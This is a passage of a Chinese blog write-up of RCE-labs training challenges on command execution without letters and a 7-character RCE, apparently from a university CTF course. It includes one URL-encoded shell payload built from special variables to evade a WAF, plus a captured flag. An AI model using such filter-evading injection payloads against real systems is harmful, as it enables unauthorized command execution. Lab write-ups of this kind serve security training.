+<h2 id="RCE-labs-Level-11-无字母命令执行-整数1的特殊变量替换"><a href="#RCE-labs-Level-11-无字母命令执行-整数1的特殊变量替换" class="headerlink" title="[RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换"></a>[RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换</h2><p>不是这道题有bug?传123不报WAF?看writeup也不行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448949940-a9815dca-0c53-4fdd-9455-d51bec500d5a.png"></p>
+<p>上一题还正常</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448921384-437919df-d9ef-4dec-b78f-0f48c213bf00.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448913779-8e6da91a-ba4b-4b59-81c0-6d2e0da914ba.png"></p>
+<p>算了给出playload吧,不知道对不对.</p>
+<p>毕竟没有对**<font style="color:rgb(51, 51, 51);"> # $ ‘ ( ) 0 &lt; \ { } </font>**<font style="color:rgb(51, 51, 51);">几项WAF,在题目给的渠道生成playload:</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449489113-e234230f-bbd7-4a4b-acc5-0bb1d2131408.png"></p>
+<p>url编码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">240</span>%3C%3C%3C%<span class="number">240</span>%5C%3C%5C%3C%5C%3C%5C%<span class="number">24</span>%5C<span class="string">&#x27;%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D0%24%7B%23%23%7D00%24%7B%23%23%7D00))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D0%24%7B%23%23%7D000))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D00%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D00%24%7B%23%23%7D0))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D0))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D00%24%7B%23%23%7D%24%7B%23%23%7D))%5C&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE-labs-Level-13-无字母命令执行-特殊扩展替换任意数字"><a href="#RCE-labs-Level-13-无字母命令执行-特殊扩展替换任意数字" class="headerlink" title="[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字"></a><font style="color:rgb(0, 0, 0);">[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449804609-f0d8a68c-4dae-41c3-9578-60f73e7b9bc3.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449819852-e0da65d5-0895-4593-a119-391348b46663.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449813675-88adc40d-bd11-4cc4-8bf2-9c81e0ddfd89.png"></p>
+<p><del>脚本真好用,学废了</del></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450113853-b5a5b902-cae6-4666-b0c0-111b217eb5c8.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449778425-fe87c76b-886d-4c3a-9852-d89bffdd1b24.png"></p>
+<h2 id="RCE-labs-Level-14-7字符RCE"><a href="#RCE-labs-Level-14-7字符RCE" class="headerlink" title="[RCE-labs]Level 14 - 7字符RCE"></a><font style="color:rgb(0, 0, 0);">[RCE-labs]Level 14 - 7字符RCE</font></h2><p>这过滤个啥啊?代码BUG?长度都是9了啊?</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450259057-e94b6607-4a5c-449f-979d-c5c62333b85a.png"></p>
+<p>换一种解题方式,就满足条件了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450294894-6161c9e4-48bb-4611-ba8e-34a724776e22.png"></p>
+<p>NSSCTF{fd8be297-d8d0-4909-90ef-574e11739831}</p>
+<p>燃尽了先写到这里吧</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io">Fischl0527</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io/2025/03/09/HnuSecTraining/2025SpringWeek1/">https://fischl0527.github.io/2025/03/09/HnuSecTraining/2025SpringWeek1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/cover/2025SpringWeek1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/01/27/2025Win/2025%20Win%20SSTI/" title="2025 Win SSTI"><img class="cover" src="/img/cover/2025WinSSTI.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2025 Win SSTI</div></div></div></a><a class="pagination-related  no-desc" href="/2025/03/18/HnuSecTraining/2025SpringWeek2/" title="2025 Spring Week2"><img class="cover" src="/img/cover/2025SpringWeek2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2025 Spring Week2</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fischl0527</div><div class="author-info-description">��������ȥ׷Ѱ���塣ҹɫ����λ����š���</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fischl0527"><i class="fab fa-github"></i><span>Fischl0527</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Fischl0527" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1587607874@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog. I am a CTFer. Welcome everyone!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BEflag"><span class="toc-number">2.</span> <span class="toc-text">找flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#view-source"><span class="toc-number">3.1.</span> <span class="toc-text">view_source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-post"><span class="toc-number">3.2.</span> <span class="toc-text">get_post</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">python脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots"><span class="toc-number">3.4.</span> <span class="toc-text">robots</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#backup"><span class="toc-number">4.1.</span> <span class="toc-text">backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie"><span class="toc-number">4.2.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#disabled-button"><span class="toc-number">4.3.</span> <span class="toc-text">disabled_button</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-js"><span class="toc-number">4.4.</span> <span class="toc-text">simple_js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xff-referer"><span class="toc-number">4.5.</span> <span class="toc-text">xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weak-auth"><span class="toc-number">4.6.</span> <span class="toc-text">weak_auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#command-execution"><span class="toc-number">4.6.1.</span> <span class="toc-text">command_execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">4.7.</span> <span class="toc-text">simple_php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%9F%BA%E7%A1%80"><span class="toc-number">5.</span> <span class="toc-text">PHP基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REC%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">REC命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-labs-Level-10-%E6%97%A0%E5%AD%97%E6%AF%8D%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B4%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.1.</span> <span class="toc-text">[RCE-labs]Level 10 - 无字母命令执行_二进制整数替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-labs-Level-11-%E6%97%A0%E5%AD%97%E6%AF%8D%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%95%B4%E6%95%B01%E7%9A%84%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.2.</span> <span class="toc-text">[RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-labs-Level-13-%E6%97%A0%E5%AD%97%E6%AF%8D%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%89%B9%E6%AE%8A%E6%89%A9%E5%B1%95%E6%9B%BF%E6%8D%A2%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97"><span class="toc-number">6.3.</span> <span class="toc-text">[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-labs-Level-14-7%E5%AD%97%E7%AC%A6RCE"><span class="toc-number">6.4.</span> <span class="toc-text">[RCE-labs]Level 14 - 7字符RCE</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/06/BUUWEB/" title="BUUWEB(持续学习中)"><img src="/img/cover/%E9%87%8D%E8%B5%B0BUUWEB%E8%B7%AF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEB(持续学习中)"/></a><div class="content"><a class="title" href="/2025/07/06/BUUWEB/" title="BUUWEB(持续学习中)">BUUWEB(持续学习中)</a><time datetime="2025-07-06T03:45:14.000Z" title="Created 2025-07-06 11:45:14">2025-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp"><img src="/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025御网杯wp"/></a><div class="content"><a class="title" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp">2025御网杯wp</a><time datetime="2025-05-11T03:45:14.000Z" title="Created 2025-05-11 11:45:14">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="十六届蓝桥杯CTF"/></a><div class="content"><a class="title" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF">十六届蓝桥杯CTF</a><time datetime="2025-04-26T03:45:14.000Z" title="Created 2025-04-26 11:45:14">2025-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp"><img src="/img/cover/2025sqCTF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025sqCTFwp"/></a><div class="content"><a class="title" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp">2025sqCTFwp</a><time datetime="2025-04-04T03:45:14.000Z" title="Created 2025-04-04 11:45:14">2025-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp"><img src="/img/cover/2025GHCTFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025GHCTFwp"/></a><div class="content"><a class="title" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp">2025GHCTFwp</a><time datetime="2025-03-21T03:45:14.000Z" title="Created 2025-03-21 11:45:14">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/HnuSecTraining/2025SpringWeek2/" title="2025 Spring Week2"><img src="/img/cover/2025SpringWeek2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025 Spring Week2"/></a><div class="content"><a class="title" href="/2025/03/18/HnuSecTraining/2025SpringWeek2/" title="2025 Spring Week2">2025 Spring Week2</a><time datetime="2025-03-18T03:45:14.000Z" title="Created 2025-03-18 11:45:14">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Fischl0527</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
